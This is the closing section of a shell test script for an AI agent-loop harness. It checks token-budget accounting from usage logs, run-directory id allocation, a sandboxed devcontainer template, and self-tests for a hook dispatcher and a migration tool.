  blog="$(mktemp)"; printf '%s\n' '{"usage":{"input_tokens":100,"output_tokens":50},"modelUsage":{"x":{"input_tokens":100,"output_tokens":50}}}' > "$blog"
  reset_budget; update_budget_from_log "$blog" >/dev/null
  ok "$([ "$(_budget_spent)" = "150" ] && echo 1 || echo 0)" "budget meters max-not-sum (expect 150, got '$(_budget_spent)')"
  # cache tokens count toward the tally (they dominate real usage in long sessions).
  printf '%s\n' '{"usage":{"input_tokens":100,"output_tokens":50,"cache_creation_input_tokens":1000,"cache_read_input_tokens":2000}}' > "$blog"
  reset_budget; update_budget_from_log "$blog" >/dev/null
  ok "$([ "$(_budget_spent)" = "3150" ] && echo 1 || echo 0)" "budget includes cache tokens (expect 3150, got '$(_budget_spent)')"
  # run id = max existing suffix + 1, not dir count (count-based ids collide after cleanup).
  tmpruns="$(mktemp -d)"; mkdir -p "$tmpruns/.runs/run-001" "$tmpruns/.runs/run-003"
  rid="$( (SCRIPT_DIR="$tmpruns"; loop_run_id) )"
  ok "$([ "$rid" = "run-004" ] && echo 1 || echo 0)" "run-004 after run-002 was cleaned up (got '$rid')"
  # The call above must have CLAIMED run-004 (mkdir-as-mutex): a second concurrent-style call gets 005.
  rid="$( (SCRIPT_DIR="$tmpruns"; loop_run_id) )"
  ok "$([ "$rid" = "run-005" ] && echo 1 || echo 0)" "allocation claims the dir (2nd call => run-005, got '$rid')"
  rm -rf "$tmpruns"
  rm -f "$passcfg" "$failcfg" "$stderrcfg" "$blog"

  # devcontainer template: must be STRICT JSON (a project copies it to .devcontainer/devcontainer.json)
  # and must mark itself a sandbox so the loop recognizes it (containerEnv.HARNESS_SANDBOX == "1").
  dcfile="$ENGINE/templates/devcontainer.json"
  ok "$([ -f "$dcfile" ] && jq empty "$dcfile" >/dev/null 2>&1 && echo 1 || echo 0)" "devcontainer.json is strict JSON (jq parses, no comments)"
  ok "$([ "$(jq -r '.containerEnv.HARNESS_SANDBOX' "$dcfile" 2>/dev/null)" = "1" ] && echo 1 || echo 0)" "devcontainer sets HARNESS_SANDBOX=1"
  ok "$([ "$(jq -r '.workspaceMount' "$dcfile" 2>/dev/null)" = "source=harness-workspace,target=/workspace,type=volume" ] && echo 1 || echo 0)" "devcontainer uses a volume workspace (no host FS bind)"
else
  echo "  (skipping jq-dependent gate/budget tests — jq not installed)"
fi

echo "plugin: cross-platform hook dispatcher (node)"
# The plugin ships hooks through plugin/hooks/run.mjs (static hooks.json can't branch on OS). Its own
# node self-test covers both OS branches + a real dispatch; fold its exit code into this suite.
REPO="$(cd "$HERE/../.." && pwd)"
if command -v node >/dev/null 2>&1; then
  if node "$REPO/plugin/hooks/run.test.mjs" >/dev/null 2>&1; then d_ok=1; else d_ok=0; fi
  ok "$d_ok" "hook dispatcher self-test passes (node)"
else
  echo "  (skipping dispatcher test — node not installed)"
fi

echo "migrate: end-to-end classify + apply on a synthetic repo"
# engine/migrate.sh has its own e2e self-test (build a synthetic copied-in harness, report, --apply);
# fold its exit code into this suite the same way as the node dispatcher above.
if bash "$HERE/migrate-test.sh" >/dev/null 2>&1; then m_ok=1; else m_ok=0; fi
ok "$m_ok" "harness-migrate self-test passes"

echo
echo "RESULT: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
